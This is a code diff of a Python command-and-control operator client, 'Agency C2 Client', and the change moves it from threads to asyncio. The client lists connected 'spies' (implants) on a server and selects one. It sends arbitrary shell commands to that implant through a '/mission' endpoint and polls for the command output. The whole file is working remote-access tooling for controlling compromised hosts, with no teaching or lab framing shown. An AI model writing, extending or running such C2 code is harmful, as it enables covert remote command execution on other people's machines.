@@ -1,76 +1,83 @@
-import requests
+import asyncio
+import aiohttp
 import argparse
-import time
-import threading
 from datetime import datetime
 
-# Global variable to store the current polling thread
-current_polling_thread = None
-stop_polling = threading.Event()
+# Global variable for the current prompt
+current_prompt = ""
 
-def poll_for_output(server, agent):
-    while not stop_polling.is_set():
-        response = requests.get(f"{server}/spy/{agent}", timeout=5)
-        if response.status_code == 200:
-            task_output = response.json().get('output')
-            if task_output:
-                print(task_output)
-                requests.get(f"{server}/cls/{agent}")  # Notify server to clear the output
-        time.sleep(3)  # Poll every 3 seconds, adjust as needed
+async def poll_for_output(server, agent, stop_polling):
+    global current_prompt
+    async with aiohttp.ClientSession() as session:
+        while not stop_polling.is_set():
+            try:
+                async with session.get(f'{server}/spy/{agent}') as response:
+                    if response.status == 200:
+                        data = await response.json()
+                        if 'output' in data and data['output']:
+                            print("\n---------- Command Output ----------\n", flush=True)
+                            print(data['output'], flush=True)
+                            print("\n------------------------------------\n", flush=True)
+                            await session.get(f'{server}/cls/{agent}')
+                            print(current_prompt, end='', flush=True)  # Reprint the current prompt
+                    await asyncio.sleep(1)  # Polling interval
+            except Exception as e:
+                print(f"Error in poll_for_output: {e}")
+                await asyncio.sleep(1)
 
-def start_polling_thread(server, agent):
-    global current_polling_thread, stop_polling
+async def send_command(server, agent, command):
+    async with aiohttp.ClientSession() as session:
+        await session.get(f'{server}/mission/{agent}/{command}')
 
-    # Stop the current polling thread if it's running
-    if current_polling_thread and current_polling_thread.is_alive():
-        stop_polling.set()  # Signal the current thread to stop
-        current_polling_thread.join()  # Wait for the current thread to finish
+async def async_input(prompt):
+    return await asyncio.to_thread(input, prompt)
 
-    # Reset the stop flag and start a new polling thread
-    stop_polling.clear()
-    current_polling_thread = threading.Thread(target=poll_for_output, args=(server, agent), daemon=True)
-    current_polling_thread.start()
-
-def menu(ip, port, name):
+async def main(ip, port, name):
+    global current_prompt
     server = f"http://{ip}:{port}"
     agent = 0
-    prompt = f"Agency C2 Client {name} $ > "
+    stop_polling = asyncio.Event()
 
     while True:
-        command = input(prompt)
-        print("\n\n")
+        if agent:
+            if 'poll_task' not in locals() or poll_task.done():
+                stop_polling.clear()
+                poll_task = asyncio.create_task(poll_for_output(server, agent, stop_polling))
 
-        if "list" in command:
-            response = requests.get(f"{server}/spies").text
-            print(response.replace("<p>", "").replace("</p>", "").replace("<br>", "\n"))
+        current_prompt = f"Agency C2 Client {name} $ > " if agent == 0 else f"Spy {agent} # > "
+        command = await async_input(current_prompt)
+
+        if command.startswith("list"):
+            async with aiohttp.ClientSession() as session:
+                async with session.get(f'{server}/spies') as response:
+                    text = await response.text()
+                    print(text.replace("<p>", "").replace("</p>", "").replace("<br>", "\n"))
             continue
 
-        if "spy" in command:
-            agent = command[4:]
-            print(agent)
-            prompt = f"Spy {agent} # >"
-            start_polling_thread(server, agent)
+        if command.startswith("spy"):
+            if agent != 0:
+                stop_polling.set()
+            agent = command.split()[1]
+            stop_polling = asyncio.Event()
             continue
 
-        if "shell" in command:
-            if agent == 0:
-                print(f"[{datetime.now()}] Please select a spy first\n\n")                
-                continue
-            else:
-                cmd = command[6:]
-                requests.get(f"{server}/mission/{agent}/{cmd}")
-                continue
-
-        if "help" in command:
-            help()
+        if command.startswith("shell") and agent != 0:
+            shell_command = ' '.join(command.split()[1:])
+            await send_command(server, agent, shell_command)
             continue
+         
+        if command =="help":
+            print("\nHelp Menu")
+            print("===Command===")
+            print("list: List all active spies")
+            print("spy <id>: Select spy No.id")
+            print("shell <command>: Execute command and display the output")
+            print("help: Display this menu")
+            print("exit: Exit Agency C2 Client\n\n")
 
-        if "exit" in command:
-            if current_polling_thread and current_polling_thread.is_alive():
-                stop_polling.set()  # Signal the current thread to stop
-                current_polling_thread.join()  # Wait for the current thread to finish
-            exit()
-            continue
+        if command == "exit":
+            stop_polling.set()
+            break
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
@@ -79,4 +86,4 @@ if __name__ == "__main__":
     parser.add_argument('--name', required=True, help='Your name')
     args = parser.parse_args()
 
-    menu(args.ip, args.port, args.name)
+    asyncio.run(main(args.ip, args.port, args.name))
